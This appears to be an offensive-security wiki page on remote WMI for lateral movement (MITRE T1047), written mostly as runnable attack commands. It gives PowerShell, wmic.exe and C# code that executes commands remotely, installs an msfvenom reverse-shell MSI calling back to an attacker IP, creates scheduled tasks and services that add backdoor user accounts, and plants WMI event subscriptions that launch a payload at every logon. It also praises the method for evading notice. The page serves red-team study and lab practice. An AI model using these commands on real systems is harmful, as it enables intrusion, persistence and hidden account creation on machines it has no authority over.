---
description: MITRE ATT&CK™  Windows Management Instrumentation - Technique T1047
---

# Remote WMI

## Theory

Windows Management Instrumentation (WMI) provides a standardized way for querying and managing various elements of a Windows operating system. It allow administrators to perform standard management tasks that attackers can abuse to perform lateral movements.

When using WMI remotely, the client application establishes a connection to the WMI service on the remote Windows machine. This connection is made using **DCOM (Distributed Component Object Model)** as the underlying transport protocol. The client initiates an RPC (Remote Procedure Call) connection to communicate with the WMI DCOM infrastructure on the remote system.

Once the DCOM connection is established, the [MS-WMI](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-wmi/c0088a94-1107-48a5-8d4d-cd16d34de5ef) protocols (Microsoft WMI Extensions to DCOM) comes into play. **MS-WMI protocols provides additional functionality that is specific to WMI operations** over the DCOM protocol. These extensions enhance DCOM to handle WMI-specific tasks such as executing WMI queries, invoking methods, and retrieving system information.

{% hint style="success" %}
This method is much more discreet than the one used by psexec, smbexec and the other main tools in the impacket suite.
{% endhint %}

## Practice

### Remote Process Creation Using WMI

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/fortra/impacket)'s [wmiexec](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py) script give you a semi-interactive shell by leveraging DCOM and the MS-WMI protocol.

```bash
#Execute commands over MS-WMI
wmiexec.py <domain>/<username>:<password>@<target>
```
{% endtab %}

{% tab title="Windows - Powershell" %}
We can spawn a process on a remote target using wmi and powershell cmdlets

#### Powershell v1+ (2006)

```powershell
#Create PSCredentials and execute commands on remote target
$credential = New-Object System.Management.Automation.PSCredential("USERNAME", (ConvertTo-SecureString "PASSWORD" -AsPlainText -Force));
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
Invoke-WmiMethod -ComputerName "TARGET" -Credential $credential -Class Win32_Process -Name Create -ArgumentList $Command
```

#### Powershell v3+ (2012)

```powershell
#Create CimSession and execute commands on remote target
$Session = New-CimSession -ComputerName "TARGET" -SessionOption (New-CimSessionOption -Protocol "DCOM") -Credential ((new-object -typename System.Management.Automation.PSCredential -ArgumentList @("USERNAME", (ConvertTo-SecureString -String "PASSW0RD" -asplaintext -force)))) -ErrorAction Stop;
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $Command }
```
{% endtab %}

{% tab title="Windows - wmic.exe" %}
We can spawn a process on a remote target using wmic.exe

```bash
wmic.exe /node:TARGET /user:Administrator /password:Mypass123 process call create "cmd.exe /c calc.exe" 
```
{% endtab %}
{% endtabs %}

### Remote MSI Installation Using WMI

{% tabs %}
{% tab title="Windows - Powershell" %}
We can install a MSI package on a remote target using wmi and powershell cmdlets. Let's create a malicious MSI using msfvenom and upload it to a share :

```bash
#Generate an evil package
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKING_IP> LPORT=<PORT> -f msi > evil64.msi

#Upload it to a share
smbclient -c 'put evil64.msi' -U <USER> '//TARGET/C$'
```

#### Powershell v1+ (2006)

```powershell
#Create PSCredentials and install MSI on remote target
$credential = New-Object System.Management.Automation.PSCredential("USERNAME", (ConvertTo-SecureString "PASSWORD" -AsPlainText -Force));
Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","c:\Windows\evil64.msi") -ComputerName "TARGET" -Credential $credential
```

#### Powershell v3+ (2012)

```powershell
#Create CimSession and install MSI on remote target
$Session = New-CimSession -ComputerName "TARGET" -SessionOption (New-CimSessionOption -Protocol "DCOM") -Credential ((new-object -typename System.Management.Automation.PSCredential -ArgumentList @("USERNAME", (ConvertTo-SecureString -String "PASSW0RD" -asplaintext -force)))) -ErrorAction Stop;
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\evil64.msi"; Options = ""; AllUsers = $false}
```
{% endtab %}

{% tab title="Windows - wmic.exe" %}
We can install a MSI package on a remote target using wmic.exe. Let's create a malicious MSI using msfvenom:

```bash
#Generate an evil package & host it on SMB server
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKING_IP> LPORT=<PORT> -f msi > evil64.msi

#Upload it to a share
smbclient -c 'put evil64.msi' -U <USER> '//TARGET/C$'
```

Execute following commands

```bash
#Install MSI on remote target
wmic.exe /node:TARGET /user:DOMAIN\USER /password:PASSWORD product call install PackageLocation=c:\evil64.msi
```
{% endtab %}
{% endtabs %}

### Remote Scheduled Tasks Creation Using WMI

{% tabs %}
{% tab title="Windows - Powershell" %}
We can create scheduled tasks on a remote target using wmi and powershell cmdlets.

#### Powershell v3+ (2012)

```powershell
#Create CimSession and scheduled task, start it
$Session = New-CimSession -ComputerName "TARGET" -SessionOption (New-CimSessionOption -Protocol "DCOM") -Credential ((new-object -typename System.Management.Automation.PSCredential -ArgumentList @("USERNAME", (ConvertTo-SecureString -String "PASSW0RD" -asplaintext -force)))) -ErrorAction Stop;
$Action = New-ScheduledTaskAction -CimSession $Session -Execute "cmd.exe" -Argument "/c net user munra22 aSdf1234 /add";
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "MyTask";
Start-ScheduledTask -CimSession $Session -TaskName "MyTask";

#Delete the task
Unregister-ScheduledTask -CimSession $Session -TaskName "MyTask"
```
{% endtab %}

{% tab title="Windows - wmic.exe" %}
We can create scheduled tasks on a remote target using wmic.exe

{% hint style="danger" %}
In Windows 8 and higher, you can only create scheduled jobs with WMI if the registry key **`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Configuration`** has a value **`EnableAt=1`** of type **`REG_DWORD`**. Therefore, this technique is unlikely to be found in the wild.
{% endhint %}

```powershell
#Create a scheduled task & start it
wmic.exe /node:TARGET /user:DOMAIN\USER /password:PASSWORD path Win32_ScheduledJob create Command="net user schTaskUser Pass123 /add",DaysOfMonth=1,DaysOfWeek=1,InteractWithDesktop=False,RunRepeatedly=False,StartTime="********143000.000000-420"
 
#Delete the task
wmic.exe /node:TARGET /user:DOMAIN\USER /password:PASSWORD path Win32_ScheduledJob where "JobiD like '1'" call Delete
```
{% endtab %}
{% endtabs %}

### Remote Service Creation Using WMI

{% tabs %}
{% tab title="Windows - Powershell" %}
We can create a service on a remote target using wmi and powershell cmdlets.

#### Powershell v1+ (2012)

```powershell
#Create PSCredentials and a service
$credential = New-Object System.Management.Automation.PSCredential("USERNAME", (ConvertTo-SecureString "PASSWORD" -AsPlainText -Force));
Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList @($false,"WMI Created Service",[byte]::Parse("1"),$null,$null,"WMICreatedService","net user wmiSvcUser Pass123 /add",$null,[byte]::Parse("16"),"Manual","NT AUTHORITY\SYSTEM","") -ComputerName TARGET -Credential $credential

#Create an handle to the service and Start it
(Get-WmiObject -Class Win32_Service -Filter "name='WMICreatedService'" -ComputerName TARGET -Credential $credential).StartService()

#Finaly stop and delete it
(Get-WmiObject -Class Win32_Service -Filter "name='WMICreatedService'" -ComputerName TARGET -Credential $credential).StopService()
(Get-WmiObject -Class Win32_Service -Filter "name='WMICreatedService'" -ComputerName TARGET -Credential $credential).Delete()
```

#### Powershell v3+ (2012)

```powershell
#Create CimSession and a service
$Session = New-CimSession -ComputerName "TARGET" -SessionOption (New-CimSessionOption -Protocol "DCOM") -Credential ((new-object -typename System.Management.Automation.PSCredential -ArgumentList @("USERNAME", (ConvertTo-SecureString -String "PASSW0RD" -asplaintext -force)))) -ErrorAction Stop;
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{ Name = "MyService"; DisplayName = "MyService"; PathName = "net user munra2 Pass123 /add"; ServiceType = [byte]::Parse("16"); StartMode = "Manual" }

#Create an handle to the service and Start it
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'MyService'"
Invoke-CimMethod -InputObject $Service -MethodName StartService

#Finaly stop and delete it
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```
{% endtab %}

{% tab title="Windows - wmic.exe" %}
We can create a service on a remote target using wmic.exe.

```powershell
#I didn't find a way to create services using wmic.exe
#Contcat me if you did

#Start it
wmic.exe /node:TARGET /user:DOMAIN\USER /password:PASSWORD path Win32_Service where "name like 'WMICreatedService'" call startservice

#Delete it
wmic.exe /node:TARGET /user:DOMAIN\USER /password:PASSWORD path Win32_Service where "name like 'WMICreatedService'" call Delete
```
{% endtab %}
{% endtabs %}

### Lateral Movement via WMI Event Subscription

Using WMI on a remote endpoint, we can perform lateral movements based on[ WMI Event Subscription Persitence](../../windows/persistence/wmi-event-subscription.md).

Typically, WMI event subscription requires creation of the following three classes which are used to store the payload or the arbitrary command, to specify the event that will trigger the payload and to relate the two classes (\_\_EventConsumer &\_\_EventFilter) so execution and trigger to bind together.

* **\_\_EventFilter** // Trigger (new process, failed logon etc.)
* **EventConsumer** // Perform Action (execute payload etc.)
* **\_\_FilterToConsumerBinding** // Binds Filter and Consumer Classes

Implementation of this technique doesn’t require any toolkit since Windows has a utility that can interact with WMI (wmic) and PowerShell can be leveraged as well.

{% tabs %}
{% tab title="Windows - Powershell" %}
Execution of the following commands using wmic.exe will create in the name space of _“**root\subscription**“_ three events. You can set the arbitrary payload to execute within 5 seconds on **every new logon session creation** or within 60 seconds **every time Windows starts.**

```powershell
#Create CimSession
$Session = New-CimSession -ComputerName "TARGET" -SessionOption (New-CimSessionOption -Protocol "DCOM") -Credential ((new-object -typename System.Management.Automation.PSCredential -ArgumentList @("USERNAME", (ConvertTo-SecureString -String "PASSW0RD" -asplaintext -force)))) -ErrorAction Stop;

#Create filter
#Query to execute payload within 60 seconds every time Windows starts:
#SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325
$FilterArgs = @{name='v4resk-WMI';
                EventNameSpace='root\CimV2';
                QueryLanguage="WQL";
                Query="SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'"};
$Filter = New-CimInstance -CimSession $Session -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

#Create consumer
$ConsumerArgs = @{name='v4resk-WMI';
                CommandLineTemplate="$($Env:SystemRoot)\System32\evil.exe";}
$Consumer=New-CimInstance -CimSession $Session -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

#Create cosnmerBinding (bind filter & consumer)
$FilterToConsumerArgs = @{
Filter = [Ref] $Filter;
Consumer = [Ref] $Consumer;
}
$FilterToConsumerBinding = New-CimInstance -CimSession $Session -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
```

We can cleanup using following commands

```powershell
$credential = (new-object -typename System.Management.Automation.PSCredential -ArgumentList @("USERNAME", (ConvertTo-SecureString -String "PASSW0RD" -asplaintext -force)))

$EventConsumerToCleanup = Get-WmiObject -ComputerName "TARGET" -Credential $credential -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'v4resk-WMI'"
$EventFilterToCleanup = Get-WmiObject -ComputerName "TARGET" -Credential $credential -Namespace root/subscription -Class __EventFilter -Filter "Name = 'v4resk-WMI'"
$FilterConsumerBindingToCleanup = Get-WmiObject -ComputerName "TARGET" -Credential $credential -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
 
$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject
```
{% endtab %}

{% tab title="Windows - wmic.exe" %}
Execution of the following commands using wmic.exe will create in the name space of _“**root\subscription**“_ three events. You can set the arbitrary payload to execute within 5 seconds on **every new logon session creation** or within 60 seconds **every time Windows starts.**

```powershell
#Create filter to execute payload within 5 seconds on every new logon session creation:
wmic /node:TARGET /user:DOMAIN\USER /password:PASSWORD /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="JustAnEventFilter", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'"
#Or
#Create filter to execute payload within 60 seconds every time Windows starts:
wmic /node:TARGET /user:DOMAIN\USER /password:PASSWORD /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="JustAnEventFilter", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"

wmic /node:TARGET /user:DOMAIN\USER /password:PASSWORD /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="JustAconsumer", ExecutablePath="C:\Windows\TEMP\evil.exe",CommandLineTemplate="C:\Windows\TEMP\evil.exe"
wmic /node:TARGET /user:DOMAIN\USER /password:PASSWORD /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"JustAnEventFilter\"", Consumer="CommandLineEventConsumer.Name=\"JustAconsumer\""
```
{% endtab %}

{% tab title="C#" %}
We can implement the same technique with following `C#` code

```csharp
// code completely stolen from @domchell article 
// https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/
// slightly modified to accommodate this lab

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management;

namespace wmisubscription_lateralmovement
{
    class Program
    {
        static void Main(string[] args)
        {

            // Connect to remote endpoint for WMI management
            string NAMESPACE = @"\\192.168.56.105\root\subscription";

            ConnectionOptions cOption = new ConnectionOptions();
            ManagementScope scope = null;
            scope = new ManagementScope(NAMESPACE, cOption);
            
            scope.Options.Username = "spotless";
            scope.Options.Password = "123456";
            scope.Options.Authority = string.Format("ntlmdomain:{0}", ".");
            
            scope.Options.EnablePrivileges = true;
            scope.Options.Authentication = AuthenticationLevel.PacketPrivacy;
            scope.Options.Impersonation = ImpersonationLevel.Impersonate;
            scope.Connect();

            // Create WMI event filter
            ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);

            string query = "SELECT * FROM __InstanceCreationEvent Within 5 Where TargetInstance Isa 'Win32_LogonSession'";
            WqlEventQuery myEventQuery = new WqlEventQuery(query);

            ManagementObject myEventFilter = wmiEventFilter.CreateInstance();
            myEventFilter["Name"] = "evilSpotlessFilter";
            myEventFilter["Query"] = myEventQuery.QueryString;
            myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
            myEventFilter["EventNameSpace"] = @"root\cimv2";
            myEventFilter.Put();

            // Create WMI event consumer
            ManagementObject myEventConsumer = new ManagementClass(scope, new ManagementPath("CommandLineEventConsumer"), null).CreateInstance();
            myEventConsumer["Name"] = "evilSpotlessConsumer";
            myEventConsumer["ExecutablePath"] = "mspaint.exe";
            myEventConsumer.Put();

            // Bind filter and consumer
            ManagementObject  myBinder = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();
            myBinder["Filter"] = myEventFilter.Path.RelativePath;
            myBinder["Consumer"] = myEventConsumer.Path.RelativePath;
            myBinder.Put();

            // Cleanup
            // myEventFilter.Delete();
            // myEventConsumer.Delete();
            // myBinder.Delete();

        }
    }
}
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/lateralmovementandpivoting" %}

{% embed url="https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/" %}

{% embed url="https://www.ired.team/offensive-security/lateral-movement/wmi-via-newscheduledtask" %}

{% embed url="https://www.ired.team/offensive-security/lateral-movement/wmi-+-msi-lateral-movement" %}
